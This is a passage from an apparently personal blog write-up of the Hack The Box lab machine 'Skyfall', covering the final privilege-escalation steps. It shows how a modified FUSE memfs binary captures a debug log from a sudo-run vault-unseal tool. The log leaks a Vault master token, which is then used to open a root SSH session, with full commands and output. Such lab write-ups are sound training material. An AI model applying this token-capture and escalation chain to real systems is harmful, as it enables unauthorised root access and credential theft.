</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;usage: main MOUNTPOINT BACKING-PREFIX&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>os</span><span class=p>.</span><span class=nf>Exit</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>mountPoint</span> <span class=o>:=</span> <span class=nx>flag</span><span class=p>.</span><span class=nf>Arg</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>prefix</span> <span class=o>:=</span> <span class=nx>flag</span><span class=p>.</span><span class=nf>Arg</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>root</span> <span class=o>:=</span> <span class=nx>nodefs</span><span class=p>.</span><span class=nf>NewMemNodeFSRoot</span><span class=p>(</span><span class=nx>prefix</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>conn</span> <span class=o>:=</span> <span class=nx>nodefs</span><span class=p>.</span><span class=nf>NewFileSystemConnector</span><span class=p>(</span><span class=nx>root</span><span class=p>,</span> <span class=kc>nil</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>server</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>fuse</span><span class=p>.</span><span class=nf>NewServer</span><span class=p>(</span><span class=nx>conn</span><span class=p>.</span><span class=nf>RawFS</span><span class=p>(),</span> <span class=nx>mountPoint</span><span class=p>,</span> <span class=o>&amp;</span><span class=nx>fuse</span><span class=p>.</span><span class=nx>MountOptions</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>Debug</span><span class=p>:</span> <span class=o>*</span><span class=nx>debug</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nx>AllowOther</span><span class=p>:</span> <span class=kc>true</span><span class=p>,</span> <span class=c1>// MODIFIED LINE
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=p>})</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>fmt</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;Mount fail: %v\n&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>os</span><span class=p>.</span><span class=nf>Exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;Mounted!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>server</span><span class=p>.</span><span class=nf>Serve</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>and build it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ go build -o memfs_modified
</span></span></span></code></pre></div><p>We repeat the steps to transfer the file, assign to it execution permissions and re-run the modified binary in the target machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:/dev/shm$ ./memfs_modified
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>usage: main MOUNTPOINT BACKING-PREFIX
</span></span></span><span class=line><span class=cl><span class=go>askyy@skyfall:/dev/shm$ ./memfs_modified output/ test
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mounted!
</span></span></span></code></pre></div><p>and in the other terminal/session we run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:/dev/shm$ cd output
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>askyy@skyfall:/dev/shm/output$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Reading: /etc/vault-unseal.yaml
</span></span></span><span class=line><span class=cl><span class=go>[-] Security Risk!
</span></span></span><span class=line><span class=cl><span class=go>[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] Check interval: 5s
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] Max checks: 5
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] Checking seal status
</span></span></span><span class=line><span class=cl><span class=go>[+] Vault sealed: false
</span></span></span></code></pre></div><p>We have now new files:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:/dev/shm$ ls
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>memfs  memfs_modified  output  test1
</span></span></span></code></pre></div><p>We can now read the contents of <code>test1</code>, which should be the content of the generated <code>debug.log</code> file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:/dev/shm$ cat test1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024/09/01 01:23:21 Initializing logger...
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Reading: /etc/vault-unseal.yaml
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Security Risk!
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Found Vault node: http://prd23-vault-internal.skyfall.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Check interval: 5s
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Max checks: 5
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Establishing connection to Vault...
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Checking seal status
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Vault sealed: false
</span></span></span></code></pre></div><p>where I can see another <code>VAULT_TOKEN</code> with value <code>hvs.I0ewVsmaKU1SwVZAKR3T0mmG</code>.</p><p>I remember that we had an <code>admin_otp_key_role</code> when we tried to log in via <code>SSH</code> and we got access denied. But what if we update the parameters with this token and we check if we have access to it with this new token? Since it is an &ldquo;admin&rdquo; token, we can try to log in as <code>root</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ export VAULT_ADDR=&#34;http://prd23-vault-internal.skyfall.htb/&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ export VAULT_ADDR=&#34;http://prd23-vault-internal.skyfall.htb/&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ export VAULT_TOKEN=&#34;hvs.I0ewVsmaKU1SwVZAKR3T0mmG&#34;
</span></span></span></code></pre></div><p>and finally try to connect via <code>SSH</code> as <code>root</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./vault ssh -role admin_otp_key_role -mode otp root@10.10.11.254
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> * Documentation:  https://help.ubuntu.com
</span></span></span><span class=line><span class=cl><span class=go> * Management:     https://landscape.canonical.com
</span></span></span><span class=line><span class=cl><span class=go> * Support:        https://ubuntu.com/pro
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>This system has been minimized by removing packages and content that are
</span></span></span><span class=line><span class=cl><span class=go>not required on a system that users do not log into.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>To restore this content, you can run the &#39;unminimize&#39; command.
</span></span></span><span class=line><span class=cl><span class=go>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Last login: Wed Mar 27 13:20:05 2024 from 10.10.14.46
</span></span></span><span class=line><span class=cl><span class=go>root@skyfall:~# whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>root
</span></span></span></code></pre></div><p>and it worked! GG.</p><p>~Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>